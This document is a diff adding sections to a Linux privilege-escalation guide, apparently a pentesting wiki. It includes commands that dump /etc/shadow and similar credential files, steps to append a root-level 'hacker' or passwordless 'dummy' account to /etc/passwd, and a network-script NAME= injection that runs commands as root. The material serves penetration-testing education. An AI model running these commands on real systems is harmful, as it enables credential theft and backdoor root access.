@@ -785,13 +785,20 @@ If you Forward Agent configured in an environment ****[**check here how to explo
 
 ## Read sensitive data
 
-Check if you can read some sensitive files and what is contained in some folders. For example:
+### Passwd/Shadow Files
 
-* `cat /etc/shadow` This is the file that contains password hashes
-* `cat /etc/security/opasswd` This file may contain password hashes history
-* `cat /etc/passwd` In some cases this file may contain hashes of passwords
+Depending on the OS the `/etc/passwd` and `/etc/shadow` files may be using a different name or there may be a backup. Therefore it's recommended **find all of hem** and **check if you can read** them and **check if there are hashes** inside the files:
 
-Check the contents of **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports**
+```bash
+#Passwd equivalent files
+cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
+#Shadow equivalent files
+cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
+```
+
+### Interesting Folders
+
+The following folders may contain backups or interesting information: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports**
 
 ```bash
 ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/
@@ -845,6 +852,36 @@ cat /proc/self/environ
 
 ## Writable files
 
+### /etc/passwd
+
+First generate a password with one of the following commands.
+
+```text
+openssl passwd -1 -salt hacker hacker
+mkpasswd -m SHA-512 hacker
+python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
+```
+
+Then add the user `hacker` and add the generated password.
+
+```text
+hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
+```
+
+E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
+
+You can now use the `su` command with `hacker:hacker`
+
+Alternatively you can use the following lines to add a dummy user without a password.  
+WARNING: you might degrade the current security of the machine.
+
+```text
+echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
+su - dummy
+```
+
+NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`.
+
 You should check if you can **write in some sensitive file**. For example, can you write to some **service configuration file**?
 
 ```bash
@@ -880,6 +917,26 @@ So, if you have **write perms** over a **log file** **or** any of its **parent f
 More detailed information about the vulnerability can be found in this page [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).
 
 You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten). 
+
+### /etc/sysconfig/network-scripts/ \(Centos/Redhat\)
+
+If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.
+
+Network scripts, _ifcg-eth0_ for example are used for network connections. The look exactly like .INI files. However, they are ~sourced~ on Linux by Network Manager \(dispatcher.d\).
+
+In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. Which means; **everything after the first blank space is executed as root**.
+
+For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
+
+```bash
+NAME=Network /bin/id
+ONBOOT=yes
+DEVICE=eth0
+```
+
+\(_Note the black space between Network and /bin/id_\)
+
+**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)\*\*\*\*
 
 ## Internal Open Ports
 
